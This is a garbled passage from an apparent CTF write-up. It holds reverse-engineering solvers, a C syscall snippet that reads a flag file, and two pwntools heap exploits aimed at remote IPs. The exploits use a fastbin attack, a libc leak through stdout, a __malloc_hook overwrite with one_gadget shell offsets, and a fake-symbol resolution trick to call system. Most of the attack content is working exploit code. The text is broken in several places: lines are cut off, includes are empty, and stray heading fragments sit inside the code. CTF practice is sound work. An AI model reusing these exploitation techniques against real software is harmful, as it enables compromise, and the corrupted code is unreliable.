    nums = [str(i) for i in range(9)]
    exp = ['n','e','n','_','(','n','_','n','_','n',')']
    for n1,n2,n3,n4,n5 in product(nums, repeat=5):
        for s1,s2,s3 in product(signs, repeat=3):
            exp[0],exp[2],exp[3],exp[5],exp[6],exp[7],exp[8],exp[9] = 
n1,n2,s1,n3,s2,n4,s3,n5
            flag = ''.join(exp)
            data = ('de1ctf{'+flag+'}').encode('ascii')
            hash = md5(data)
            if hash.hexdigest() == '293316bfd246fa84e566d7999df88e79':
Signal vm
 ptrace  vm
7x7 x10
                print(data)
                exit()
if __name__ == '__main__':
    re4() 
from z3 import *
def re3():
    magic = 'Almost heaven west virginia, blue ridge mountains'
    dst = [214, 77, 45, 133, 119, 151, 96, 98, 43, 136, 134, 202, 114, 151, 
235, 137, 152, 243, 120, 38, 131, 41, 94, 39, 67, 251, 184, 23, 124, 206, 58, 
115, 207, 251, 199, 156, 96, 175, 156, 200, 117, 205, 55, 123, 59, 155, 78, 
195, 218, 216, 206, 113, 43, 48, 104, 70, 11, 255, 60, 241, 241, 69, 196, 208, 
196, 255, 81, 241, 136, 81]
    assert len(dst) == 70
    s = Solver()
    v = [BitVec('v%d'%i, 8) for i in range(70)]
    for a in range(10):
        for round in range(7):
            sum = v[a*7] * ord(magic[round])
            for j in range(1, 7):
                idx = (j 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
struct x{
  char * cat;
  char * flag;
  char * null;
};
int main()
{
  char * flag = "/home/ctf/flag";
  char * cat = "cat";
  struct x xx;
  xx.cat = cat;
  xx.flag = flag;
  xx.null = 0;
  char ** x = &xx;
  char *args[3]={cat, flag,0};  
  char *name = "/bin/cat";
        //execveat(0, "/bin/cat",args, 0,0);
__asm__ __volatile__(
"mov $322,%%rax\n"
"xor %%rdi,%%rdi\n"
"mov %0,%%rsi\n"
"mov %1,%%rdx\n"
"xor %%rcx,%%rcx\n"
"xor %%r10,%%r10\n"
"xor %%r8,%%r8\n"
"xor %%r9,%%r9\n"
"syscall" ::"m"(name),"m"(x));
}
stdoutlibc
uafmalloc_hookchunk,malloc_hookone_gadget
from pwn import *
# s = process("./pwn 2")
# gdb.attach(s,"b *$rebase(0xe9b)")
# raw_input(">")
s = remote('139.180.216.34',8888)
def add(size,idx,buf):
    s.sendlineafter("choice >>","1")
    s.sendlineafter("wlecome input your size of weapon: ", str(size))
    s.sendlineafter("input index:",str(idx))
    s.sendafter("input your name:",buf)
def free(idx):
    s.sendlineafter("choice >>","2")
    s.sendlineafter("input idx :", str(idx))
    s.recvuntil("Done!")
def edit(idx,buf):
    s.sendlineafter("choice >>","3")
    s.sendlineafter("input idx:",str(idx))
    s.sendafter("new content:",buf)
add(0x18,0,( p64(0x21)+p64(0x21)) )
add(0x60,1,p64(0x21)+p64(0x21))
add(0x18,2,p64(0x21)+p64(0x21))
add(0x60,7,(p64(0x21)+p64(0x21)*6))
add(0x10,4,p64(0x21)+p64(0x21))
free(1)
free(0)
free(2)
free(0)
add(0x18,0,'\x10')
add(0x18,0,'\x00')
add(0x18,0,'\x10')
add(0x18,3,p64(0)+p64(0x91))
free(1)
# addr = int(raw_input("add:"),16)+0x10
edit(3,p64(0)+p64(0x71)+'\xdd'+chr(5+0x80))
add(0x60,5,'\x00')
payload = 'A'*51+p64(0xfbad3887)
payload = payload.ljust(83,'A')+'\x50'+chr(6+0x80)
# raw_input(">")
add(0x60,5,payload)
s.recvline()
libc = s.recv(8).ljust(8,'\x00')
libc = u64(libc)
Mimic_note
success(hex(libc))
libcbase = libc-3954339
success(hex(libcbase))
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
puts = libcbase+libc.symbols['puts']
success(hex(puts))
malloc_hook = libcbase + libc.symbols['__malloc_hook']
success(hex(malloc_hook))
free(1)
edit(3,p64(0)+p64(0x71)+p64(malloc_hook-0x23))
add(0x60,5,'\x00')
one_gadget = libcbase+0xf1147
add(0x60,5,'A'*19+p64(one_gadget))
s.sendline("1")
s.sendline("30")
s.sendline("8")
s.interactive()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
from pwn import *
p = remote('45.32.120.212', 6666)
#p = process('./mimic_note_64')
#p = process('./mimic')
#lib32 = ELF('/lib/i386-linux-gnu/libc-2.23.so')
#lib64 = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def add(size):
  p.recvuntil('>>')
  p.sendline('1')
  p.recvuntil('?')
  p.sendline(str(size))
def dele(idx):
  p.recvuntil('>>')
  p.sendline('2')
  p.recvuntil('?')
  p.sendline(str(idx))
def edit(idx,cont):
  p.recvuntil('>>')
  p.sendline('4')
  p.recvuntil('?')
  p.sendline(str(idx))
  p.recvuntil('?')
  p.send(cont)
add(0x104)
add(0x104)
add(0x104)
add(0x10)
add(0x10)
edit(1,'a'*(0x100-8)+p32(0x100)+p32(0x109+8))
edit(0,(p32(0)+p32(0x109-8)+p32(0x804a060-12)+p32(0x804a060-8)).ljust(0x104-
4,'\x00')+p32(0x100))
dele(1)
edit(0,p32(0)*3+p32(0x804a060)+p32(0x200)+p32(0)*2+p32(0x804a8e8)+p32(0x300)+p
32(0x804A024)+p32(0x200)+p32(0x804A018)+p32(0x100))
dynsym = 0x080481d8
dynstr = 0x080482C8
fake_sym_addr = 0x804a8f8
rel = 0x80483C8
off = 0x804a8e8 - rel
print off
index_dynsym = (fake_sym_addr - dynsym) / 0x10
print hex(fake_sym_addr)
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(0x804A024) + p32(r_info)
st_name = 0x804a8e8+0x28 - dynstr
print hex(st_name)
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)+p32(0)+p32(0)
edit(2,fake_reloc.ljust(0x10,'\x00')+fake_sym+'system\x00\x00`cat /flag`\x00')
edit(4,p32(0x08048422))
edit(3,p32(0x80488F6))#off 0x60-0x3c
edit(0,p32(0x804a060)+p32(0x300)+p32(0)*2+p32(0x804a014)+p32(100)+
(p32(0x804a020)+p32(0x100))*2)
edit(2,p32(0x08048422)*2)
off32 = 0x6c-0x3c
add(0x108)#
Crypto
xorz
keytableprintable
add(0x108)#5
add(0xf8)#6
add(0xf8)#7